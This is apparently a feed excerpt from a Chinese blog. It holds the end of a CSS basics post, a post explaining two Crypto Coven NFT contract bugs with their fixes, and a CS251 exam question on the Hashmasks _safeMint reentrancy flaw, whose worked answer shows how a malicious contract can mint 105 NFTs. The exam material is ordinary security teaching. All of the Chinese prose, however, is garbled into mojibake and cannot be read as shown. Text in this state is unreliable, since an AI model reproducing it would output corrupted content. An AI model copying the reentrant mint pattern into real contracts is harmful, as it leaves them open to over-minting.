1-0-0-0ï¼›</li><li><code>!important</code>: æ— æ•Œï¼Œæˆ‘æ˜¯è€å¤§ï¼Œå‘Šè¯‰æµè§ˆå™¨å¿…é¡»ä½¿ç”¨æˆ‘å®šä¹‰çš„å±æ€§ï¼›</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/129540180-af9db964-ba31-4349-ba31-d271eba84078.png" alt="Untitled 3"></p><ul><li><code>g</code>ï¼šç›´æ¥åœ¨å…ƒç´ ä¸­ä½¿ç”¨å±æ€§ï¼Œæƒé‡æœ€é«˜ï¼Œå¯ä»¥çœ‹åš 1-0-0-0ï¼›</li><li><code>z</code>ï¼šidé€‰æ‹©å™¨ï¼Œæƒé‡æ¬¡å­ï¼Œå¯ä»¥çœ‹åš 0-1-0-0ï¼›</li><li><code>y</code>ï¼šç±»ã€ä¼ªç±»ã€å±æ€§é€‰æ‹©å™¨ï¼Œæƒé‡ä½ï¼Œå¯ä»¥çœ‹åš 0-0-1-0ï¼›</li><li><code>x</code>ï¼šå…ƒç´ ã€ä¼ªå…ƒç´ é€‰æ‹©å™¨ï¼Œæƒé‡æœ€ä½ï¼Œå¯ä»¥çœ‹åš 0-0-0-1ï¼›</li></ul><h3><span id="dong-hua">åŠ¨ç”»</span></h3><p>ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼</p><ul><li>animationï¼šCSSåŠ¨ç”»ï¼Œå¯è®¾ç½®ä¸åŒå¸§çš„åŠ¨æ•ˆï¼›</li><li>transitionï¼šè¿™ç§å±äºè¿‡æ¸¡åŠ¨ç”»ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ä¿®æ”¹æŸäº› CSS å±æ€§çš„æ—¶å€™ï¼Œå±æ€§ä¼šæœ‰ä¸€ä¸ªæ¸å˜çš„è¿‡ç¨‹ã€‚</li></ul><ol><li>animation</li></ol><ul><li>animation-name: åŠ¨ç”»çš„åå­—ï¼Œè¿™ä¸ªæ˜¯é€šè¿‡ <code>@keyframes</code> å®šä¹‰çš„åå­—ã€‚ <code>@keyframes</code> æŒ‡å®šæŸä¸€å¸§çš„åŠ¨ç”»å¦‚ä½•å˜åŒ–ï¼Œå¯é€šè¿‡ % æ¥æ§åˆ¶å„ä¸ªé˜¶æ®µçš„å±æ€§å€¼</li><li>animation-durationï¼šåŠ¨ç”»çš„æŒç»­æ—¶é—´ï¼›</li><li>animation-delayï¼šåŠ¨ç”»å¼€å§‹æ—¶çš„å»¶è¿Ÿæ—¶é—´ï¼›</li><li>animation-iteration-countï¼šåŠ¨ç”»å¾ªç¯æ¬¡æ•°ï¼›</li><li>animation-directionï¼šåŠ¨ç”»çš„æ–¹å‘ï¼Œæ¯”å¦‚ alternate è¡¨ç¤ºå…ˆæ­£å‘åé€†åºï¼Œnomal æ­£å‘ï¼Œreverse é€†åºï¼›</li><li>animation-timing-functionï¼šåŠ¨ç”»çš„æ—¶é—´æ›²çº¿ï¼Œå®ƒçš„å€¼æœ‰ easeã€ease-inã€ease-outã€ease-in-outã€linearï¼›</li><li>animation-fill-modeï¼šåŠ¨ç”»æ‰§è¡Œåçš„å¡«å……æ¨¡å¼ï¼Œå®ƒçš„å€¼æœ‰ forwardsã€backwardsã€noneã€bothï¼›</li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.move-box-animation</span> &#123;</span><br><span class="line">    <span class="comment">/* animation: name duration timing-function delay iteration-count direction fill-mode; */</span></span><br><span class="line">    <span class="comment">/* åå­—ï¼Œä¸º @keyframes çš„åå­— */</span></span><br><span class="line">    <span class="attribute">animation-name</span>: move;</span><br><span class="line">    <span class="comment">/*  åŠ¨ç”»çš„æ—¶é—´ */</span></span><br><span class="line">    <span class="attribute">animation-duration</span>: <span class="number">5s</span>;</span><br><span class="line">    <span class="comment">/* åŠ¨ç”»æ‰§è¡Œå‡½æ•° */</span></span><br><span class="line">    <span class="attribute">animation-timing-function</span>: ease-in-out;</span><br><span class="line">    <span class="comment">/* åŠ¨ç”»å»¶è¿Ÿæ—¶é—´ */</span></span><br><span class="line">    <span class="attribute">animation-delay</span>: <span class="number">1s</span>;</span><br><span class="line">    <span class="comment">/* åŠ¨ç”»é‡å¤æ¬¡æ•° */</span></span><br><span class="line">    <span class="attribute">animation-iteration-count</span>: <span class="number">10</span>;</span><br><span class="line">    <span class="comment">/* åŠ¨ç”»çš„æ–¹å‘ï¼Œå…ˆæ­£å‘åé€†å‘ */</span></span><br><span class="line">    <span class="attribute">animation-direction</span>: alternate;</span><br><span class="line">    <span class="comment">/* åŠ¨ç”»æ‰§è¡Œåçš„å¡«å……æ¨¡å¼ */</span></span><br><span class="line">    <span class="attribute">animation-fill-mode</span>: backwards;</span><br><span class="line">    <span class="comment">/* åŠ¨ç”»çš„è¿è¡ŒçŠ¶æ€ */</span></span><br><span class="line">    <span class="attribute">animation-play-state</span>: running;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> move &#123;</span><br><span class="line">    <span class="number">0%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="number">25%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="number">50%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="number">75%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>transition</li></ol><ul><li>è¿‡æ¸¡åŠ¨ç”»ï¼Œä¿®æ”¹æŸäº›å±æ€§çš„æ—¶å€™ä¸ä¼šç«‹åˆ»ç”Ÿæ•ˆï¼Œå®ƒä¼šä»¥åŠ¨ç”»çš„å½¢å¼é€æ¸è¿‡æ¸¡åˆ°è¦è®¾ç½®çš„å€¼</li><li>transition-property: æŒ‡éœ€è¦ä½¿ç”¨è¿‡æ¸¡åŠ¨ç”»çš„å±æ€§ï¼Œè¿™é‡Œè®¾ç½®äº†èƒŒæ™¯è‰²ï¼Œé«˜åº¦å’Œå®½åº¦ã€‚ä¹Ÿå¯ä»¥é€šè¿‡å…³é”®å­— all è®¾ç½®æ‰€æœ‰çš„å±æ€§ï¼›</li><li>transition-duration: åŠ¨ç”»æŒç»­çš„æ—¶é—´ï¼Œå¯ä»¥å•ç‹¬æ§åˆ¶æŸä¸ªå±æ€§çš„æ—¶é—´ï¼ŒÂ transition-durationï¼š1.8s, 1.0s, 1.0s è¡¨ç¤ºä¿®æ”¹ background-color éœ€è¦ 1.8s, ä¿®æ”¹ height éœ€è¦ 1.0s, Â ä¿®æ”¹ width éœ€è¦ 1.0s;</li><li>transition-delayï¼šåŠ¨ç”»å¼€å§‹æ—¶éœ€è¦å»¶è¿Ÿå¤šé•¿æ—¶é—´æ‰å¼€å§‹æ‰§è¡Œï¼›</li><li>transition-timing-functionï¼šè¡¨ç¤ºåŠ¨ç”»æ‰§è¡Œæ—¶çš„æ—¶é—´å‡½æ•°ï¼Œä¸åŒå‡½æ•°èµ°è¿‡çš„æ›²çº¿ä¸ä¸€æ ·ï¼›</li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.move-transition</span> &#123;</span><br><span class="line">    <span class="comment">/* transition-property: all; */</span></span><br><span class="line">    <span class="attribute">transition-property</span>: background-color, height, width;</span><br><span class="line">    <span class="attribute">transition-duration</span>: <span class="number">1.8s</span>, <span class="number">1.0s</span>, <span class="number">1.0s</span>;</span><br><span class="line">    <span class="attribute">transition-delay</span>: <span class="number">0.1s</span>;</span><br><span class="line">    <span class="attribute">transition-timing-function</span>: linear;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="chang-du-dan-wei">é•¿åº¦å•ä½</span></h3><ol><li>ç›¸å¯¹å•ä½ï¼šç›¸å¯¹å•ä½æŒ‡å®ƒçš„å°ºå¯¸æ˜¯ç›¸å¯¹äºå¦å¤–ä¸€ä¸ªå…ƒç´ çš„å°ºå¯¸ã€‚å¸¸ç”¨çš„æ˜¯ emã€remã€vhã€vwã€vminã€vmaxã€‚<ul><li>em: å®ƒæ˜¯ç›¸å¯¹äºã€Œè‡ªèº«æˆ–çˆ¶å…ƒç´ ã€çš„ font-size æ¥è®¡ç®—è‡ªèº«çš„å°ºå¯¸</li><li>remï¼ˆfont size of root elementï¼‰: è¿™ä¸ªå•ä½æ˜¯ä¾æ®ã€Œæ ¹å…ƒç´  html æ ‡ç­¾ã€çš„ font-size æ¥è®¡ç®—æœ€ç»ˆçš„å€¼ï¼Œè¿™ä¸ªå•ä½å¯¹ç§»åŠ¨ç«¯webå¼€å‘ååˆ†å®ç”¨ï¼Œé€šè¿‡è®¾ç½® html çš„ font-size æ¥ç­‰æ¯”ç¼©æ”¾å…ƒç´ çš„å¤§å°ã€‚</li><li><strong>vwï¼ˆviewport widthï¼‰</strong>ï¼Œå¯è§†åŒºåŸŸå®½åº¦ï¼Œæ¯”å¦‚è®¾ç½® 50vwï¼Œç›¸å½“äºå¯è§†åŒºåŸŸå®½åº¦çš„ä¸€åŠï¼›</li><li><strong>vhï¼ˆviewport heightï¼‰</strong>ï¼Œå¯è§†åŒºåŸŸé«˜åº¦ï¼Œæ¯”å¦‚è®¾ç½® 50vhï¼Œç›¸å½“äºå¯è§†åŒºåŸŸé«˜åº¦çš„ä¸€åŠï¼›</li><li><strong>vmax</strong>: vw å’Œ vh ä¸­æœ€å¤§çš„ï¼›</li><li><strong>vmin</strong>: vw å’Œ vh ä¸­æœ€å°çš„ï¼›</li></ul></li><li>ç»å¯¹å•ä½<ul><li>åƒç´  pxï¼Œ cmç­‰</li></ul></li><li>æ—¶é—´å•ä½<ul><li>s</li><li>ms</li></ul></li></ol><h3><span id="yi-fu-yong-yi-wei-hu-jie-gou-qing-xi-de-css">æ˜“å¤ç”¨ã€æ˜“ç»´æŠ¤ã€ç»“æ„æ¸…æ™°çš„ CSS</span></h3><p>lessï¼Œsass</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CSS åŸºç¡€â”€â”€æ ·å¼ç¯‡
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="è¯»ä¹¦ç¬”è®°" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>è§£é‡Š Crypto Coven åˆçº¦çš„ä¸¤ä¸ª bug</title>
    <link href="https://qiwihui.com/qiwihui-blog-154/"/>
    <id>https://qiwihui.com/qiwihui-blog-154/</id>
    <published>2024-05-15T02:25:31.383Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>Crypto Coven åˆçº¦ä½œè€…åœ¨ä»–çš„æ–‡ç«  <a href="https://cryptocoven.mirror.xyz/0eZ0tjudMU0ByeXLlRtPzDqxGzMMZw6ldzf-HfYETW0">Crypto Coven Contract Bugs: An Arcanistâ€™s Addendum</a> ä¸­æè¿°äº†åˆçº¦ä¸­çš„ä¸¤ä¸ª bugï¼Œè¿™ç¯‡æ–‡ç« æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸¤ä¸ªbugã€‚è¿™ä¸¤ä¸ª bug å¹¶ä¸ä¼šå½±å“å¥³å·« NFT çš„æ‰€æœ‰æƒã€‚</p><span id="more"></span><h2><span id="bug-1-zong-gong-ke-zhu-zao-nu-wu-de-shu-liang">Bug 1ï¼šæ€»å…±å¯é“¸é€ å¥³å·«çš„æ•°é‡</span></h2><p>åœ¨åˆçº¦ä¸­æœ‰ä¸€ä¸ªä¿®æ”¹å™¨ <code>canMintWitches()</code> ç”¨æ¥æ£€æŸ¥åœ°å€æ˜¯å¦èƒ½å¤Ÿåœ¨å…¬å¼€å‘å”®é˜¶æ®µé“¸é€ æ›´å¤šçš„ NFTï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public maxWitches; // åˆå§‹åŒ–ä¸º 9,999</span><br><span class="line">uint256 public maxGiftedWitches; // åˆå§‹åŒ–ä¸º 250</span><br><span class="line"></span><br><span class="line">modifier canMintWitches(uint256 numberOfTokens) &#123;</span><br><span class="line">    require(</span><br><span class="line">        tokenCounter.current() + numberOfTokens &lt;=</span><br><span class="line">            maxWitches - maxGiftedWitches,</span><br><span class="line">        &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">    );</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„ bug åªä¼šåœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹è§¦å‘ã€‚é—®é¢˜åœ¨äºåº”è¯¥æœ‰ 9749 ä¸ªå¥³å·«åœ¨å…¬å¼€å‡½æ•°ä¸­é“¸é€ ï¼Œ250ä¸ªåœ¨ owner-only å‡½æ•°ä¸­é“¸é€ ï¼Œå…±è®¡9999ä¸ªã€‚è¿™ä¸ªé€»è¾‘åœ¨å…¬å¼€å‘å”®é˜¶æ®µå¦‚æœæ²¡æœ‰å¥³å·«è¢«èµ é€ï¼Œåˆ™å®Œå…¨æ­£å¸¸ã€‚ç„¶è€Œï¼Œé¡¹ç›®æ–¹åœ¨è¿™æœŸé—´é“¸é€ å¹¶èµ é€äº†å¥³å·«ï¼Œè¿™æ„å‘³ç€åœ¨ä¸Šé¢çš„æ¡ä»¶æ£€æŸ¥ä¸­ï¼Œå³è¾¹çš„æ€»æ•°åº”è¯¥ä¹Ÿè¦å˜åŒ–æ‰æ­£ç¡®ã€‚é“¸é€ èµ é€è¶Šå¤šï¼Œç›¸åº”èƒ½å…è®¸çš„ <code>tokenId</code> è¶Šé«˜ã€‚</p><p>åœ¨å…¬å¼€å‘å”®ç»“æŸçš„æ—¶å€™ï¼Œæœ‰93ä¸ªå¥³å·«è¢«èµ é€ï¼Œè¿™æ„å‘³ç€ <code>tokenCounter.current()</code> åˆ°è¾¾ 9749 ä½¿å¾—å…¬å¼€å‘å”®ç»“æŸæ—¶ï¼Œæ€»å…±åªæœ‰ 9656 ä¸ªå¥³å·«è¢«é“¸é€ ã€‚</p><p><code>canGiftWitches()</code> å‡½æ•°çš„ä½œç”¨æ˜¯ä¸ºäº†é™åˆ¶å¯ä»¥èµ é€çš„å¥³å·«æ•°é‡æœ€å¤§ä¸º 250ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼è§„é¿ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public maxWitches; // åˆå§‹åŒ–ä¸º 9,999</span><br><span class="line">uint256 public maxGiftedWitches; // åˆå§‹åŒ–ä¸º 250</span><br><span class="line">uint256 private numGiftedWitches;</span><br><span class="line"></span><br><span class="line">modifier canGiftWitches(uint256 num) &#123;</span><br><span class="line">    require(</span><br><span class="line">        numGiftedWitches + num &lt;= maxGiftedWitches,</span><br><span class="line">        &quot;Not enough witches remaining to gift&quot;</span><br><span class="line">    );</span><br><span class="line">    require(</span><br><span class="line">        tokenCounter.current() + num &lt;= maxWitches,</span><br><span class="line">        &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">    );</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯ï¼Œæœ‰93ä¸ªå¥³å·«æ°¸ä¹…æ¶ˆå¤±ï¼Œåˆçº¦æ€»å…±é“¸é€ äº†9906ä¸ªå¥³å·«ã€‚</p><h3><span id="xiu-fu-fang-fa">ä¿®å¤æ–¹æ³•</span></h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>numGiftedWitches</code> è®°å½•å·²ç»èµ é€çš„å¥³å·«æ•°é‡æ¥ä¿®æ­£ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public maxWitches; // åˆå§‹åŒ–ä¸º 9,999</span><br><span class="line">uint256 public maxGiftedWitches; // åˆå§‹åŒ–ä¸º 250</span><br><span class="line">uint256 private numGiftedWitches;</span><br><span class="line"></span><br><span class="line">modifier canMintWitches(uint256 numberOfTokens) &#123;</span><br><span class="line">    require(</span><br><span class="line">        tokenCounter.current() + numberOfTokens &lt;=</span><br><span class="line">            maxWitches - maxGiftedWitches + numGiftedWitches,</span><br><span class="line">        &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">    );</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="bug-2-ban-shui">Bug 2ï¼šç‰ˆç¨</span></h2><p>Crypto Coven è®¤ä¸ºæ‹¥æœ‰é“¾ä¸Šç‰ˆç¨å¾ˆé‡è¦ï¼Œè€Œä¸ä»…ä»…æ˜¯ä½¿ç”¨ç‰¹å®šäºå¹³å°çš„é“¾ä¸‹å®ç°ï¼Œè¿™å°±ä½¿å¾—ä»–ä»¬ä½¿ç”¨äº† <a href="https://eips.ethereum.org/EIPS/eip-2981">EIP-2981</a>ã€‚ æ”¯æŒè¯¥æ ‡å‡†çš„ä»£ç å¾ˆç®€å•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function royaltyInfo(uint256 tokenId, uint256 salePrice)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    override</span><br><span class="line">    returns (address receiver, uint256 royaltyAmount)</span><br><span class="line">&#123;</span><br><span class="line">    require(_exists(tokenId), &quot;Nonexistent token&quot;);</span><br><span class="line"></span><br><span class="line">    return (address(this), SafeMath.div(SafeMath.mul(salePrice, 5), 100));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„å‘¢ï¼Ÿ å¸‚åœºè°ƒç”¨è¯¥å‡½æ•°æ¥è¯»å–æ¥æ”¶æ–¹åœ°å€å’Œç‰ˆç¨é‡‘é¢çš„æ•°æ®ï¼Œç„¶åç›¸åº”åœ°å‘é€ç‰ˆç¨ã€‚ åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œæ¥æ”¶æ–¹æ˜¯åˆçº¦åœ°å€ï¼Œç‰ˆç¨é‡‘é¢æ˜¯ 5%ã€‚ç„¶è€Œï¼Œä» Solifidy 0.6.x å¼€å§‹ï¼Œåˆçº¦å¿…éœ€è¦å®ç° <code>receive()</code> æ–¹æ³•æ‰èƒ½æ¥æ”¶ä»¥å¤ªï¼Œè€Œå¥³å·«åˆçº¦æ²¡æœ‰å®ç°ã€‚å¹¶ä¸”ï¼Œåˆçº¦çš„æµ‹è¯•åœ¨æ£€æŸ¥ <code>royaltyInfo()</code> å‡½æ•°æ—¶ï¼Œæ£€æŸ¥äº†æ˜¯å¦è¿”å›æ­£ç¡®çš„å€¼ï¼Œä½†æ˜¯æ²¡æœ‰æµ‹è¯•æ¥æ”¶ç‰ˆç¨ï¼Œæ‰€ä»¥å¦‚æœå¸‚åœºå°è¯•å‘é€ç‰ˆç¨ç»™åˆçº¦ä¼šå¼•èµ· <code>revert</code> ã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¡¥æ•‘æªæ–½éå¸¸ç®€å•ï¼Œè¿™è¦å½’åŠŸäº <a href="https://royaltyregistry.xyz/">Royalty Registry</a>ã€‚ é¡¹ç›®æ–¹é…ç½®äº†ä¸€ä¸ªè¦†ç›–æŒ‡å‘ä¸åŒçš„æ¥æ”¶è€… <code>receiver</code> åœ°å€ï¼ˆåœ¨æœ¬ä¾‹ä¸­ï¼Œæ˜¯ä»–ä»¬çš„å¤šé‡ç­¾åé’±åŒ…ï¼‰ï¼Œæ‰€ä»¥ç°åœ¨ä» Royalty Registry è¯»å–çš„å¸‚åœºå°†ä½¿ç”¨è¦†ç›–åçš„å€¼ã€‚</p><h3><span id="xiu-fu-fang-fa">ä¿®å¤æ–¹æ³•</span></h3><p>ä¿®å¤æ­¤é”™è¯¯ä»¥æ”¯æŒ EIP-2981 çš„æœ€ç®€å•æ–¹æ³•æ˜¯ç®€å•åœ°è¿”å›æ¥æ”¶ææ¬¾çš„æ‰€æœ‰è€…åœ°å€ï¼Œè€Œä¸æ˜¯åˆçº¦åœ°å€ã€‚ å¦ä¸€ç§é€‰æ‹©æ˜¯æ·»åŠ ä¸€ä¸ª <code>royalReceiverAddress</code> å˜é‡å’Œä¸€ä¸ª <code>setter</code> å‡½æ•°æ¥é…ç½®è¿™ä¸ªå€¼ã€‚</p><p>å¦‚æœç¡®å®æƒ³å°†ä»¥å¤ªæ¥æ”¶åˆ°åˆçº¦åœ°å€ï¼Œä½ éœ€è¦åšçš„å°±æ˜¯åœ¨åˆçº¦ä¸­æ·»åŠ ä¸€ä¸ª <code>receive()</code> å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">receive() external payable &#123;&#125;</span><br></pre></td></tr></table></figure><h2><span id="zong-jie">æ€»ç»“</span></h2><p>å­¦ä¹ åœ¨ Solidity ä¸­è¿›è¡Œå¼€å‘å¯èƒ½æ˜¯ä¸€åœºè€ƒéªŒâ€”â€”æ— è®ºæ˜¯å°é”™è¯¯è¿˜æ˜¯å¤§é”™è¯¯ï¼Œéƒ½ä¼šæ°¸è¿œå­˜åœ¨äºåŒºå—é“¾ä¸Šï¼Œè€Œä¸”é€šå¸¸è¦ä»˜å‡ºå·¨å¤§çš„ä»£ä»·ã€‚ ä½†æ˜¯ï¼Œè¿™åƒµåŒ–ã€æ— æƒ…çš„ç©ºé—´å´æœ‰å®ƒè‡ªå·±çš„é­…åŠ›ï¼Œåœ¨çº¦æŸä¸­è¯ç”Ÿçš„åˆ›é€ åŠ›ï¼Œé€šè¿‡å…±åŒçš„ä¸çœ ä¹‹å¤œå½¢æˆçš„å›¢ç»“ã€‚ å¯¹äºä»»ä½•åœ¨è’é‡ä¸­é—¯å‡ºè‡ªå·±é“è·¯çš„åˆå‡ºèŒ…åºçš„å¥¥æœ¯å¸ˆï¼šæˆ‘å¸Œæœ›è¿™é‡Œæ‰€æä¾›çš„çŸ¥è¯†èƒ½å¤Ÿè¿›ä¸€æ­¥ç…§äº®è¿™æ¡é“è·¯ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      è§£é‡Š Crypto Coven åˆçº¦çš„ä¸¤ä¸ª bug
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CS251 - final 2021 - é—®é¢˜ 4</title>
    <link href="https://qiwihui.com/qiwihui-blog-157/"/>
    <id>https://qiwihui.com/qiwihui-blog-157/</id>
    <published>2024-05-15T02:25:31.381Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p><strong>é—®é¢˜4. [16 åˆ†]: Hashmasks é‡å…¥ç¼ºé™·</strong></p><p>åœ¨ç¬¬8è¯¾å’Œç¬¬3èŠ‚ä¸­ï¼Œæˆ‘ä»¬è®¨è®ºäº† solidity é‡å…¥ç¼ºé™·ã€‚åœ¨è¿™ä¸ªé—®é¢˜ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹ä¸€ä¸ªæœ‰è¶£çš„ç°å®ä¸–ç•Œçš„ä¾‹å­ã€‚è€ƒè™‘ä¸‹é¢16384ä¸ªNFTä¸­ä½¿ç”¨çš„ solidity ä»£ç ç‰‡æ®µã€‚é€šè¿‡è°ƒç”¨æ­¤NFTåˆçº¦ä¸Šçš„ <code>mintNFT()</code> å‡½æ•°ï¼Œç”¨æˆ·ä¸€æ¬¡æœ€å¤šå¯ä»¥é“¸é€ 20ä¸ªNFTã€‚æ‚¨å¯ä»¥å‡è®¾æ‰€æœ‰å†…éƒ¨å˜é‡éƒ½ç”±æ„é€ å‡½æ•°æ­£ç¡®åˆå§‹åŒ–ï¼ˆæœªæ˜¾ç¤ºï¼‰ã€‚</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function mintNFT(uint256 numberOfNfts) public payable &#123;</span><br><span class="line">  require(totalSupply() &lt; 16384, &#x27;Sale has already ended&#x27;);</span><br><span class="line">  require(numberOfNfts &gt; 0, &#x27;numberOfNfts cannot be 0&#x27;);</span><br><span class="line">  require(numberOfNfts &lt;= 20, &#x27;You may not buy more than 20 NFTs at once&#x27;);</span><br><span class="line">  require(totalSupply().add(numberOfNfts) &lt;= 16384, &#x27;Exceeds NFT supply&#x27;);</span><br><span class="line">  require(getNFTPrice().mul(numberOfNfts) == msg.value, &#x27;Value sent is not correct&#x27;);</span><br><span class="line">  for (uint256 i = 0; i &lt; numberOfNfts; i++) &#123;</span><br><span class="line">    uint256 mintIndex = totalSupply(); // get number of NFTs issued so far</span><br><span class="line">    _safeMint(msg.sender, mintIndex); // mint the next one</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _safeMint(address to, uint256 tokenId) internal virtual override &#123;</span><br><span class="line">  // Mint one NFT and assign it to address(to).</span><br><span class="line">  require(!_exists(tokenId), &#x27;ERC721: token already minted&#x27;);</span><br><span class="line">  _data = _mint(to, tokenId); // mint NFT and assign it to address to</span><br><span class="line">  _totalSupply++; // increment totalSupply() by one</span><br><span class="line">  if (to.isContract()) &#123;</span><br><span class="line">    // Confirm that NFT was recorded properly by calling</span><br><span class="line">    // the function onERC721Received() at address(to).</span><br><span class="line">    // The arguments to the function are not important here.</span><br><span class="line">    // If onERC721Received is implemented correctly at address(to) then</span><br><span class="line">    // the function returns _ERC721_RECEIVED if all is well.</span><br><span class="line">    bytes4 memory retval = IERC721Receiver(to).onERC721Received(to, address(0), tokenId, _data);</span><br><span class="line">    require(retval == _ERC721_RECEIVED, &#x27;NFT Rejected by receiver&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬è¯æ˜ <code>_safeMint</code> æ ¹æœ¬ä¸å®‰å…¨ï¼ˆå°½ç®¡å®ƒçš„åå­—æ˜¯å®‰å…¨ï¼‰ã€‚</p><p><strong>A)</strong>Â Â Â  å‡è®¾å·²ç»é“¸é€ äº†16370ä¸ªNFTï¼Œé‚£ä¹ˆ totalSupply()=16370ã€‚è¯·è§£é‡Šæ¶æ„åˆçº¦å¦‚ä½•å¯¼è‡´è¶…è¿‡16384ä¸ªNFTè¢«ä¼ªé€ ã€‚æ”»å‡»è€…æœ€å¤šå¯ä»¥é€ å‡ºå¤šå°‘ä¸ªNFTï¼Ÿ</p><p>æç¤ºï¼šå¦‚æœåœ¨è°ƒç”¨åœ°å€ <code>onERC721Received</code> æ˜¯æ¶æ„çš„ï¼Œç»“æœä¼šæ€æ ·ï¼Ÿè¯·ä»”ç»†æ£€æŸ¥é“¸å¸å›è·¯ï¼Œå¹¶è€ƒè™‘é‡å…¥ç¼ºé™·ã€‚</p><p><strong>ç­”ï¼š</strong> åœ¨å·²ç» mint 16370 ä¸ªNFTåŸºç¡€ä¸Šï¼Œè°ƒç”¨ mingNFT å¯ä¼ å…¥çš„æœ€å¤§ numberOfNfts ä¸º 14 å¯ä»¥é€šè¿‡ mintNFT å¼€å§‹äº”è¡Œçš„é™åˆ¶ï¼Œå½“ä¸Šè¿°åˆçº¦åœ¨è°ƒç”¨åœ°å€ <code>to</code> ä¸Šçš„ <code>onERC721Received</code> å‡½æ•°æ—¶ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥å†æ¬¡è°ƒç”¨ä¸Šè¿° mingNFT å‡½æ•°ï¼Œæ­¤æ—¶ï¼Œåœ¨åŸæ¥å·²ç» mint ä¸€ä¸ªçš„åŸºç¡€ä¸Šï¼Œä¼ å…¥çš„ numberOfNfts ä¸º 13 ä¸ªå¯ä»¥é€šè¿‡ mintNFT çš„é™åˆ¶ï¼Œç„¶åé‡å¤åŒæ ·çš„è¿‡ç¨‹ï¼Œä¾æ¬¡å¯ä»¥ mint 12ï¼Œ 11 ç›´åˆ° 1ï¼Œæœ€ååœ¨å‡½æ•°å†…éƒ¨ï¼Œå·²ç»æ²¡æœ‰å…¶ä»–é™åˆ¶ï¼Œæ•…è¿™äº›æ•°é‡çš„ NFT å‡å¯ä»¥è¢« mintï¼Œæ‰€ä»¥ç†è®ºä¸Šæ€»å…±å¯ä»¥ mint çš„æ•°é‡ä¸º $14+13+\dots+2+1=105$ã€‚</p><p><strong>B)</strong>Â Â Â  